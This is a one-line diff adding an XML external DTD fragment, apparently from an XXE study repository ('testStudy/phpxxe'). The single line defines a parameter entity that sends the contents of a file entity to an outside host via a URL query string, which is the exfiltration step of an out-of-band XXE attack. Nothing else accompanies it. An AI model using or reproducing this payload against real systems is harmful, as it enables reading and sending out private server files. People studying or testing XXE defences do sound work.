@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY % send SYSTEM 'https://yaoyaodj.github.io/testStudy/phpxxe/test.php?file=%file;'>">
